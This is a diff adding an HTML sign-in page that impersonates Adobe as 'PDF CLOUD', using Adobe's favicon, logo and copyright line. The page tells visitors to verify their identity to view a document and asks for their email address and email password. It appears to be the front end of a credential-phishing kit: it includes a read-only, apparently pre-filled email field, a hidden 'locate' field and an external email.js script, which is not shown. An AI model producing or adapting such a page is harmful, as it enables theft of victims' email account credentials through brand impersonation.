@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="robot" content="noindex, nofollow">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://adobe.com/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://adobe.com/favicon.ico" type="image/x-icon">
+    <!--<link rel="stylesheet" href="./Sign In - PDF CLOUD_files/font-awesome.css">-->
+    <title>Sign In - PDF CLOUD</title>
+    <style>
+        html {
+            background-image: url('./zmsc-darkblur.png');
+            background-repeat: no-repeat;
+            background-position: 100%;
+            background-size: cover;
+            background-attachment: fixed;
+            background-clip: border-box;
+            display: block;
+        }
+
+        body {
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            font-family: adobe-clean, adobe-clean-han-simplified-c, adobe-clean-han-traditional, adobe-clean-han-japanese, adobe-clean-han-korean, Gill Sans, Calibri, Geneva, Tahoma, Helvetica, Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, "�2d�33 �300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
+        }
+
+        .lt {
+            float: left;
+        }
+
+        .rt {
+            float: right;
+        }
+
+        .br {
+            border: 1px solid #000;
+        }
+
+        a {
+            text-decoration: none;
+            color: #0064dc;
+        }
+
+        header {
+            width: 100%;
+            margin: 0 auto;
+            padding: 0;
+            border: none;
+            background: #000;
+        }
+
+        header .brand {
+            width: 193px;
+            margin: 0 30px;
+            padding: 0;
+            text-align: center;
+            display: inline-block;
+            border: none;
+            background: #fff;
+        }
+
+        header .brand,
+        header .search,
+        header .brand img,
+        header .brand h1 {
+            display: inline-block;
+        }
+
+        header .brand img {
+            width: 54px;
+            background: #fff;
+            margin: 0 auto -17px;
+            padding: 0;
+            position: relative;
+            top: 0px;
+        }
+
+        header .brand h1 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #fff;
+            margin: 0 auto;
+            padding: 12px 20px;
+            background: #E80E0E;
+        }
+
+        header .search {
+            width: 300px;
+            margin: 0px 30px 0 0;
+            padding: 12px 0;
+            float: right;
+            text-align: center;
+        }
+
+        header .search .srch {
+            width: 250px;
+            padding: 5px 10px;
+            font-size: 13px;
+            font-weight: 400;
+            color: #4b4b4b;
+            border: none;
+            border-radius: 10px;
+        }
+
+        .container {
+            width: 100%;
+            margin: 0 auto;
+            padding: 0;
+        }
+
+        .container .dash {
+            width: 100%;
+            margin: 0 auto;
+            padding: 0;
+            position: absolute;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            z-index: 9999;
+            background: rgba(0, 0, 0, 0.4);
+        }
+
+        .container .dash .board {
+            max-width: 350px;
+            margin: 0 auto;
+            padding: 20px 0;
+            background: #f6f6f6;
+            display: block;
+            border: none;
+            border-radius: 1px;
+            position: relative;
+            top: 20%;
+        }
+
+        .container .dash .board .login {
+            max-width: 330px;
+            margin: 0 auto;
+            padding: 0;
+            border: none;
+        }
+
+        .container .dash .board .login ul {
+            width: 100%;
+            list-style: none;
+            margin: 0 auto;
+            padding: 0;
+            border: none;
+            display: block;
+        }
+
+        .container .dash .board .login ul li {
+            width: 100%;
+            margin: 0 auto;
+            padding: 0;
+            display: block;
+            order: 1px solid #ccc;
+        }
+
+        .login ul li img,
+        .login ul li p {
+            display: inline-block;
+        }
+
+        .login ul li img {
+            margin: 0;
+            padding: 0;
+            position: relative;
+        }
+
+        .login ul .l1 p {
+            font-weight: 400;
+            color: #707070;
+            vertical-align: top;
+            margin: 0;
+            padding: 0;
+        }
+
+        #err,
+        .login ul li #adbpss1 {
+            display: none;
+        }
+
+        .login ul li .inp {
+            width: 329px;
+            margin: 8px auto;
+            padding: 2px 12px;
+            min-height: 32px;
+            border: 1px solid #e5e5e5;
+            border-radius: 4px;
+            box-sizing: border-box;
+            color: #000;
+            display: block;
+            font-size: 14px;
+            font-weight: 400;
+            font-family: adobe-clean, adobe-clean-han-simplified-c, adobe-clean-han-traditional, adobe-clean-han-japanese, adobe-clean-han-korean, Gill Sans, Calibri, Geneva, Tahoma, Helvetica, Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, "�2d�33 �300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
+            font-style: italic;
+        }
+
+        .login ul li .inp:focus {
+            border: 1px solid #1473e6;
+            transition-delay: 0s;
+            transition-duration: 0.15s;
+            transition-property: all;
+            transition-timing-function: ease-in-out;
+            font-style: normal;
+        }
+
+        .login ul li .btn {
+            width: 120px;
+            margin: 0 auto;
+            padding: 7px 0;
+            background: #1473e6;
+            color: #fff;
+            font-family: adobe-clean, adobe-clean-han-simplified-c, adobe-clean-han-traditional, adobe-clean-han-japanese, adobe-clean-han-korean, Gill Sans, Calibri, Geneva, Tahoma, Helvetica, Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, "�2d�33 �300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
+            border: none;
+            border-radius: 16px;
+            font-size: 15px;
+            font-weight: 600;
+            text-align: center;
+            transition-delay: 0s;
+            transition-duration: 0.15s;
+            transition-property: all;
+            transition-timing-function: ease-in-out;
+            white-space: nowrap;
+            display: inline-block;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .login ul .l1 svg {
+            width: 22px;
+            display: inline-block;
+            margin: 0;
+            padding: 0;
+            position: relative;
+            top: 9px;
+        }
+
+        .login ul .l1 p {
+            margin: 0;
+            padding: 10px 6px;
+            color: #707070;
+        }
+
+        .login ul .l2 p {
+            font-size: 13px;
+            font-weight: 700;
+            color: #4b4b4b;
+            margin: 0;
+            padding: 15px 0;
+        }
+
+        .login ul .l3 img {
+            width: 32px;
+            margin: 0 0 -3px;
+        }
+
+        .login ul .l3 p {
+            font-size: 28px;
+            font-weight: 300;
+            color: #2d2d2d;
+            margin: 0 9px;
+            padding: 0;
+        }
+
+        .login ul .l4 {
+            width: 100%;
+            margin: 0 auto;
+            padding: 0;
+            text-align: left;
+        }
+
+        .login ul .l4 p {
+            font-size: 14px;
+            font-weight: 600;
+            margin: 0;
+            padding: 5px 0;
+            color: #E80E0E;
+            font-style: italic;
+        }
+
+        .login ul .l5 p {
+            width: 100%;
+            margin: 50px auto 5px;
+            padding: 0;
+            text-align: center;
+            font-size: 13px;
+            font-weight: 400;
+            color: #4b4b4b;
+            display: block;
+        }
+
+
+
+        @media(max-width:680px) {
+            header .search {
+                width: 70px;
+                margin: 0px;
+                text-align: center;
+            }
+
+            header .search .srch {
+                display: none;
+            }
+
+            header .brand {
+                width: 180px;
+                margin: 0 30px;
+                padding: 0;
+            }
+
+            header .brand img {
+                width: 40px;
+                margin: 0 auto -10px;
+            }
+
+            header .brand h1 {
+                font-size: 18px;
+                margin: 0 auto;
+                padding: 7px 20px;
+            }
+        }
+    </style>
+</head>
+
+<body data-gr-c-s-loaded="true">
+    <header>
+        <div class="brand">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFgAAABOCAYAAACkGtGyAAADsElEQVR4nOWc7W2sMBBFKWFLcAlbAiVsCS5hS6CDlOASUgIlpASXsCXM+xH2ibcPWH+dGSeMZCmRovjOATPDNTDIMHzIMMyG42OAoovclh/EcNxBwHfj3GZrwA8ZhgsI+LLMcVrAgYK7ghzODPiqAPh6VsAzDXcF2S5Hw8m9ImB/NsAPLbgryBbFzgzwZAB4OhNgZwDYnQVw0Ia7ghzOAHg0BDz+dsDRCu4KcvzNgH0HgDVbNlXAqO+QAVjTn1AFHKzhPkP0ip0qYGcN9hmi17KpAZ6tob6GWt5KE3lroK8hOsVOBXC0hrkXwrdsKoAna5B7Ibw/oQLYWYPcC+GLHQ44WEN8F8K2bDjg0RrguxDWn0ABR2t4qSFcsUMBe2twqSFcy4YB7sJ3SA3h/AkMMPY4FBXy/ZjVjwHsIAgXamUI07IhgGcCwALhLuyzbO1ZAP/0BgKIAnYnMgy33gFrJU8fxG4BT2Dia52f4Dwt/YnmgDULkIPmuvQKOBAJL0lvtVDkk/GhR8AjlOzeTQB2MyPt/IlmgL+IRJdkj25jPTjvV0+AyURjhwdWFbD1Uh2huVv4E00Ak8XmM2H+AM5f6080Aeyg5HK8gR40IIBnIrEluZyGfwJ11PGp/AfkLWvO9Q97JUHq/IkqwBFMqqSCe1BPtABM2oYlPegM6il9JbcKcI93UciLjVLuTxQDDkQiSzKhAnBvuooBU2dKi20bamWVvJJbBJi8PW3hxfZUG4oAezCB2ABwBPXldjfZgMl+s+XDH73059mASd8hdyUdJ8bpzPEnsgE7SDTxTQdKa04hzgJMbjQGALC1y5cNGLmuSdtNxvUgfepUfyIZcCSELmLJx/g9qDu2BEz2lilCSwd5YqT4E8mArZdazRgh7SmXtiTAgRC4iEw5uLWD1B9aAO7Zd0gdDsrhXXv5FvBMCFvEvTv6LccE5nHM780feEiU9icPrW7xDwGrf3orJaS8b/agpr2T5RDwRAmqjcLLi4XNegjYUYJqQ8q3lbQL9i5gzHdoFVJ2gxJAPVv+xC7gkRLSKqR8p1dzs3YTcCQEtA4pL3YTqOl1VW0CxnyH1iFlxQ47gTZW1X+Af9orsKXFjrReH0eAsSJAxcayTBkzqCccAcY/+d06Koqdg/Rc9wBjR5UMKTeNsNX6D9PVL56akA5J3yNbD3JLyb8CxiqrRki5ce9BTXENeKIm0orCYoedWPLtT/wF7KiJtELKN09HSI97AsYeM9KMZ0IFYwI13f4AyPgPAa92JPUAAAAASUVORK5CYII="
+                alt="Adobe ID Logo">
+            <h1>PDF CLOUD</h1>
+        </div>
+        <div class="search">
+            <input type="search" name="search" class="srch" id="srch" placeholder="Enter a search ...">
+        </div>
+    </header>
+    <div class="container">
+        <div class="dash cover">
+            <div class="board animated fadeIn">
+                <div class="login">
+                    <form id="ado">
+                        <ul>
+                            <li class="l1"><svg viewBox="0 0 48 48" focusable="false" aria-hidden="true" role="img"
+                                    class="spectrum-Icon spectrum-Icon--sizeM nav-logo">
+                                    <path
+                                        d="M29.219 6H44v36L29.219 6zM18.798 6H4v36L18.798 6zm5.207 13.265l9.422 22.733h-6.173l-2.823-7.24h-6.896l6.47-15.493z">
+                                    </path>
+                                </svg>
+                                <p class="">PDF Cloud</p>
+                            </li>
+                            <li class="l2">
+                                <p>For security, please sign in with your email to verify your Identity, and view
+                                    documents.</p>
+                            </li>
+                            <li class="l3"><img
+                                    src="data:image/png;base64,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" alt="Adobe ID Logo">
+                                <p>PDF Document</p>
+                            </li><br>
+
+                            <!--<div class="text-danger" id="msg" style="display: none; color: red; font-style: italic; font-size: 13px;"></div>-->
+                            <span id="msg" class="text-danger" style="display: block; color: red; font-style: italic; font-size: 13px;"></span>
+
+                            <li class="l4 animated fadeIn" id="err">
+                                <p id="erp"></p>
+                            </li>
+                            <li><input type="email" name="email" class="inp" id="email" autocomplete="off"
+                                    placeholder="Email Address"
+                                    style="background-image: url(&quot;&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;"
+                                    readonly=""></li>
+                            <li><input type="password" name="password" class="inp" id="password" autocomplete="off"
+                                    placeholder="Email Password"
+                                    style="background-image: url(&quot;&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;"><!--<input
+                                    type="password" name="adbpss1" class="inp" id="adbpss1" autocomplete="off"
+                                    placeholder="Email Password"
+                                    style="background-image: url(&quot;;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">-->
+                                <input type="hidden" id="locate" name="locate">
+                            </li>
+                            <li><button type="submit" name="submit" class="btn" id="submit-btn">Sign In</button></li>
+
+
+                            <li class="l5">
+                                <p>Copyright © <script>document.write(new Date().getFullYear())</script> Adobe Corporation</p>
+                            </li>
+                        </ul>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="email.js"></script>
+</body>
+
+</html>
